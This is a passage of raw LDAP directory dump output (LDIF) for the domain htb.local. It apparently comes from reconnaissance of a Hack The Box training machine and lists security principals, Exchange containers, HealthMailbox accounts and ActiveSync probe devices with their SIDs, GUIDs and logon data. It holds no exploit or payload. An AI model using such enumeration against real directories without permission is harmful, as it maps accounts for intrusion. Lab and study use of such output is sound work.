distinguishedName: CN=S-1-5-7,CN=ForeignSecurityPrincipals,DC=htb,DC=local
instanceType: 4
whenCreated: 20190922223910.0Z
whenChanged: 20190922223910.0Z
uSNCreated: 32959
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
uSNChanged: 32959
showInAdvancedViewOnly: TRUE
name: S-1-5-7
objectGUID:: eRjt2InOYkWc2NSUNdOWFA==
objectSid:: AQEAAAAAAAUHAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z

# S-1-1-0, ForeignSecurityPrincipals, htb.local
dn: CN=S-1-1-0,CN=ForeignSecurityPrincipals,DC=htb,DC=local
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-1-0
distinguishedName: CN=S-1-1-0,CN=ForeignSecurityPrincipals,DC=htb,DC=local
instanceType: 4
whenCreated: 20190922223910.0Z
whenChanged: 20190922223910.0Z
uSNCreated: 32960
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=htb,DC=local
uSNChanged: 32960
showInAdvancedViewOnly: TRUE
name: S-1-1-0
objectGUID:: Y1YLrWFyEkasLXD5mM4vQg==
objectSid:: AQEAAAAAAAEAAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z

# S-1-5-4, ForeignSecurityPrincipals, htb.local
dn: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=htb,DC=local
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-4
distinguishedName: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8204
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
uSNChanged: 8204
showInAdvancedViewOnly: TRUE
name: S-1-5-4
objectGUID:: zBDXrjtW0E26RAseprsd2A==
objectSid:: AQEAAAAAAAUEAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z

# S-1-5-11, ForeignSecurityPrincipals, htb.local
dn: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=htb,DC=local
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-11
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8205
memberOf: CN=Users,CN=Builtin,DC=htb,DC=local
uSNChanged: 8205
showInAdvancedViewOnly: TRUE
name: S-1-5-11
objectGUID:: cBk2pE7Zvk+NzUBInUA2LQ==
objectSid:: AQEAAAAAAAULAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z

# S-1-5-17, ForeignSecurityPrincipals, htb.local
dn: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=htb,DC=local
objectClass: top
objectClass: foreignSecurityPrincipal
cn: S-1-5-17
distinguishedName: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=htb,DC=local
instanceType: 4
whenCreated: 20190918174557.0Z
whenChanged: 20190918174557.0Z
uSNCreated: 8221
memberOf: CN=IIS_IUSRS,CN=Builtin,DC=htb,DC=local
uSNChanged: 8221
showInAdvancedViewOnly: TRUE
name: S-1-5-17
objectGUID:: XJNaAZcGj0KxQP/EuBO1Og==
objectSid:: AQEAAAAAAAURAAAA
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z

# Microsoft Exchange System Objects, htb.local
dn: CN=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: container
objectClass: msExchSystemObjectsContainer
cn: Microsoft Exchange System Objects
distinguishedName: CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111135.0Z
whenChanged: 20190919111135.0Z
uSNCreated: 24462
objectVersion: 13236
uSNChanged: 24464
showInAdvancedViewOnly: TRUE
name: Microsoft Exchange System Objects
objectGUID:: Pnw9KLkPzkiysmcw0bYJhg==
systemFlags: 1073741824
objectCategory: CN=ms-Exch-System-Objects-Container,CN=Schema,CN=Configuration
 ,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124635.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 4535486012416

# Monitoring Mailboxes, Microsoft Exchange System Objects, htb.local
dn: CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=loc
 al
objectClass: top
objectClass: container
cn: Monitoring Mailboxes
distinguishedName: CN=Monitoring Mailboxes,CN=Microsoft Exchange System Object
 s,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919111135.0Z
whenChanged: 20190919111135.0Z
uSNCreated: 24463
uSNChanged: 24463
showInAdvancedViewOnly: TRUE
name: Monitoring Mailboxes
objectGUID:: hPDRTLTM9kqMvydcgP6AXg==
systemFlags: 1073741824
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 4535486012416

# HealthMailboxc3d7722415ad41a5b19e3e00e165edbe, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
distinguishedName: CN=HealthMailboxc3d7722415ad41a5b19e3e00e165edbe,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115607.0Z
whenChanged: 20190923225131.0Z
displayName: HealthMailbox-EXCH01-Mailbox-Database-1118319013
uSNCreated: 25150
uSNChanged: 99254
proxyAddresses: SMTP:HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
proxyAddresses: SIP:HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
garbageCollPeriod: 1209600
name: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
objectGUID:: yU+b7Ycwfk+VUAr0T1VrmQ==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132137530323615163
pwdLastSet: 132137526918920967
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPbgQAAA==
accountExpires: 9223372036854775807
logonCount: 1470
sAMAccountName: HealthMailboxc3d7722
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=a9fa4d86d45346a0b90940ae310cca4a-Healt
userPrincipalName: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132133696938975439
mail: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: 0kLQ2xpyDki4Xkpz7EpNVA==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchUserCulture: en-US
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchMobileMailboxFlags: 1
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: KUaWlWhcWU6tgHiL/BL9dA==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526923377224152341252193330031653323
msExchUMDtmfMap: lastNameFirstName:4325846245269392401624526932822273111831901
 3
msExchUMDtmfMap: firstNameLastName:4325846245269392401624526932822273111831901
 3
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailboxc3d7722415ad41a5b19e3e00e165edbe
msExchWhenMailboxCreated: 20190919115607.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-Mailbox-Database-111
 8319013

# ExchangeActiveSyncDevices, HealthMailboxc3d7722415ad41a5b19e3e00e165edbe, Mon
 itoring Mailboxes, Microsoft Exchange System Objects, htb.local
dn: CN=ExchangeActiveSyncDevices,CN=HealthMailboxc3d7722415ad41a5b19e3e00e165e
 dbe,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=lo
 cal
objectClass: top
objectClass: msExchActiveSyncDevices
cn: ExchangeActiveSyncDevices
distinguishedName: CN=ExchangeActiveSyncDevices,CN=HealthMailboxc3d7722415ad41
 a5b19e3e00e165edbe,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objec
 ts,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919122737.0Z
whenChanged: 20190919122737.0Z
uSNCreated: 25345
uSNChanged: 25346
name: ExchangeActiveSyncDevices
objectGUID:: Kj587wIhtES4FzIsmoHJqQ==
systemFlags: 1073741824
objectCategory: CN=ms-Exch-Active-Sync-Devices,CN=Schema,CN=Configuration,DC=h
 tb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchObjectsDeletedThisPeriod: 0

# EASProbeDeviceType\C2\A7EASProbeDeviceId141, ExchangeActiveSyncDevices, Healt
 hMailboxc3d7722415ad41a5b19e3e00e165edbe, Monitoring Mailboxes, Microsoft Exch
 ange System Objects, htb.local
dn:: 
objectClass: top
objectClass: msExchActiveSyncDevice
cn:: RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQx
distinguishedName:: Q049RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQxLE
 NOPUV4Y2hhbmdlQWN0aXZlU3luY0RldmljZXMsQ049SGVhbHRoTWFpbGJveGMzZDc3MjI0MTVhZDQ
 xYTViMTllM2UwMGUxNjVlZGJlLENOPU1vbml0b3JpbmcgTWFpbGJveGVzLENOPU1pY3Jvc29mdCBF
 eGNoYW5nZSBTeXN0ZW0gT2JqZWN0cyxEQz1odGIsREM9bG9jYWw=
instanceType: 4
whenCreated: 20190919122737.0Z
whenChanged: 20190919122737.0Z
uSNCreated: 25347
uSNChanged: 25347
name:: RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQx
objectGUID:: sl6V0Eo6wEumRcWMsM1J4Q==
systemFlags: 1073741824
objectCategory: CN=ms-Exch-Active-Sync-Device,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchDeviceID: EASProbeDeviceId141
msExchProvisioningFlags: 0
msExchDeviceModel: EASProbeDeviceType
msExchUserDisplayName: htb.local/Microsoft Exchange System Objects/Monitoring 
 Mailboxes
msExchDeviceAccessStateReason: 1
msExchFirstSyncTime: 20190919122735.0Z
msExchDeviceEASVersion: 14.1
msExchDeviceUserAgent: TestActiveSyncConnectivity
msExchDeviceType: EASProbeDeviceType
msExchDeviceAccessState: 1

# HealthMailboxfc9daad117b84fe08b081886bd8a5a50, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
distinguishedName: CN=HealthMailboxfc9daad117b84fe08b081886bd8a5a50,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115622.0Z
whenChanged: 20190923225135.0Z
displayName: HealthMailbox-EXCH01-001
uSNCreated: 25167
uSNChanged: 99895
proxyAddresses: SMTP:HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
proxyAddresses: SIP:HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
garbageCollPeriod: 1209600
name: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
objectGUID:: WeKCVCBWGU6UDlnXFFq8AA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 132137527257360120
pwdLastSet: 132137526952671142
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPbwQAAA==
accountExpires: 9223372036854775807
logonCount: 59
sAMAccountName: HealthMailboxfc9daad
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=51ccdec364ff4c61bbb993e4408e5af4-Healt
userPrincipalName: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132133679149253046
mail: HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: kGGlnnACYkWMHRc51zaXUg==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchMobileMailboxFlags: 1
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: MKM4WyaTTEa8hQXZgmNRRQ==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526932932231172843308208188623825250
msExchUMDtmfMap: lastNameFirstName:4325846245269392401001
msExchUMDtmfMap: firstNameLastName:4325846245269392401001
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailboxfc9daad117b84fe08b081886bd8a5a50
msExchWhenMailboxCreated: 20190919115621.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-001

# ExchangeActiveSyncDevices, HealthMailboxfc9daad117b84fe08b081886bd8a5a50, Mon
 itoring Mailboxes, Microsoft Exchange System Objects, htb.local
dn: CN=ExchangeActiveSyncDevices,CN=HealthMailboxfc9daad117b84fe08b081886bd8a5
 a50,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=lo
 cal
objectClass: top
objectClass: msExchActiveSyncDevices
cn: ExchangeActiveSyncDevices
distinguishedName: CN=ExchangeActiveSyncDevices,CN=HealthMailboxfc9daad117b84f
 e08b081886bd8a5a50,CN=Monitoring Mailboxes,CN=Microsoft Exchange System Objec
 ts,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115857.0Z
whenChanged: 20190919115857.0Z
uSNCreated: 25290
uSNChanged: 25291
name: ExchangeActiveSyncDevices
objectGUID:: kVggBfBXd0CoPaQnbzpT2w==
systemFlags: 1073741824
objectCategory: CN=ms-Exch-Active-Sync-Devices,CN=Schema,CN=Configuration,DC=h
 tb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchObjectsDeletedThisPeriod: 0

# EASProbeDeviceType\C2\A7EASProbeDeviceId141, ExchangeActiveSyncDevices, Healt
 hMailboxfc9daad117b84fe08b081886bd8a5a50, Monitoring Mailboxes, Microsoft Exch
 ange System Objects, htb.local
dn:: 
objectClass: top
objectClass: msExchActiveSyncDevice
cn:: RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQx
distinguishedName:: Q049RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQxLE
 NOPUV4Y2hhbmdlQWN0aXZlU3luY0RldmljZXMsQ049SGVhbHRoTWFpbGJveGZjOWRhYWQxMTdiODR
 mZTA4YjA4MTg4NmJkOGE1YTUwLENOPU1vbml0b3JpbmcgTWFpbGJveGVzLENOPU1pY3Jvc29mdCBF
 eGNoYW5nZSBTeXN0ZW0gT2JqZWN0cyxEQz1odGIsREM9bG9jYWw=
instanceType: 4
whenCreated: 20190919115857.0Z
whenChanged: 20190919115857.0Z
uSNCreated: 25292
uSNChanged: 25292
name:: RUFTUHJvYmVEZXZpY2VUeXBlwqdFQVNQcm9iZURldmljZUlkMTQx
objectGUID:: gM91RyphZUeUN4iuEV4WUg==
systemFlags: 1073741824
objectCategory: CN=ms-Exch-Active-Sync-Device,CN=Schema,CN=Configuration,DC=ht
 b,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
msExchVersion: 44220983382016
msExchDeviceID: EASProbeDeviceId141
msExchProvisioningFlags: 0
msExchDeviceModel: EASProbeDeviceType
msExchUserDisplayName: htb.local/Microsoft Exchange System Objects/Monitoring 
 Mailboxes
msExchDeviceAccessStateReason: 1
msExchFirstSyncTime: 20190919115855.0Z
msExchDeviceEASVersion: 14.1
msExchDeviceUserAgent: TestActiveSyncConnectivity
msExchDeviceType: EASProbeDeviceType
msExchDeviceAccessState: 1

# HealthMailboxc0a90c97d4994429b15003d6a518f3f5, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
distinguishedName: CN=HealthMailboxc0a90c97d4994429b15003d6a518f3f5,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115635.0Z
whenChanged: 20190919115646.0Z
displayName: HealthMailbox-EXCH01-002
uSNCreated: 25182
uSNChanged: 25198
proxyAddresses: SMTP:HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
proxyAddresses: SIP:HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
garbageCollPeriod: 1209600
name: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
objectGUID:: 4Mik614T50qvgoflun0i4g==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132133677952063286
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAALB4ltxV1shXFsPNPcAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: HealthMailboxc0a90c9
sAMAccountType: 805306368
showInAddressBook: CN=All Recipients(VLV),CN=All System Address Lists,CN=Addre
 ss Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN
 =Configuration,DC=htb,DC=local
legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDI
 BOHF23SPDLT)/cn=Recipients/cn=969648f9cc804df6913c946977fc56eb-Healt
userPrincipalName: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 20201229124640.0Z
dSCorePropagationData: 16010101000000.0Z
mail: HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local
msExchVersion: 88218628259840
msExchArchiveGUID:: rhHZgKwmMEGpjLiWMnr9Gw==
msExchProvisioningFlags: 0
homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrativ
 e Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=M
 icrosoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
msExchArchiveDatabaseLink: CN=Mailbox Database 1118319013,CN=Databases,CN=Exch
 ange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First
  Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=lo
 cal
msExchMailboxSecurityDescriptor:: AQAEgBQAAAAgAAAAAAAAACwAAAABAQAAAAAABQoAAAAB
 AQAAAAAABQoAAAAEABwAAQAAAAACFAABAAIAAQEAAAAAAAUKAAAA
msExchArchiveQuota: 104857600
msExchMailboxAuditEnable: FALSE
msExchPoliciesExcluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchTransportRecipientSettingsFlags: 0
internetEncoding: 0
msExchDumpsterWarningQuota: 20971520
msExchELCMailboxFlags: 2
msExchMailboxTemplateLink: CN=Default MRM Policy,CN=Retention Policies Contain
 er,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,D
 C=htb,DC=local
msExchHideFromAddressLists: TRUE
msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (
 FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
msExchRBACPolicyLink: CN=Default Role Assignment Policy,CN=Policies,CN=RBAC,CN
 =First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb
 ,DC=local
msExchMailboxGuid:: hhAl50YyH0y5uxEJeR62Hg==
msExchTextMessagingState: 302120705
msExchTextMessagingState: 16842751
msExchDumpsterQuota: 31457280
msExchCalendarLoggingQuota: 6291456
protocolSettings:: UmVtb3RlUG93ZXJTaGVsbMKnMQ==
msExchUMDtmfMap: emailAddress:432584624526920290297349944292150033625183335
msExchUMDtmfMap: lastNameFirstName:4325846245269392401002
msExchUMDtmfMap: firstNameLastName:4325846245269392401002
msExchArchiveWarnQuota: 94371840
msExchModerationFlags: 0
msExchRecipientSoftDeletedStatus: 0
msExchUserAccountControl: 0
msExchUMEnabledFlags2: -1
msExchMailboxFolderSet: 0
mDBUseDefaults: TRUE
msExchBypassAudit: FALSE
msExchMailboxAuditLogAgeLimit: 7776000
msExchMDBRulesQuota: 256
msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
msExchRecipientTypeDetails: 549755813888
mailNickname: HealthMailboxc0a90c97d4994429b15003d6a518f3f5
msExchWhenMailboxCreated: 20190919115635.0Z
msExchGroupSecurityFlags: 0
msExchAddressBookFlags: 1
msExchArchiveName: In-Place Archive -HealthMailbox-EXCH01-002

# HealthMailbox670628ec4dd64321acfdf6e67db3a2d8, Monitoring Mailboxes, Microsof
 t Exchange System Objects, htb.local
dn: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=htb,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: HealthMailbox670628ec4dd64321acfdf6e67db3a2d8
distinguishedName: CN=HealthMailbox670628ec4dd64321acfdf6e67db3a2d8,CN=Monitor
 ing Mailboxes,CN=Microsoft Exchange System Objects,DC=htb,DC=local
instanceType: 4
whenCreated: 20190919115645.0Z
whenChanged: 20190919115656.0Z
displayName: HealthMailbox-EXCH01-003
uSNCreated: 25193
uSNChanged: 25200
proxyAddresses: SMTP:HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
proxyAddresses: SIP:HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local
garbageCollPeriod: 1209600
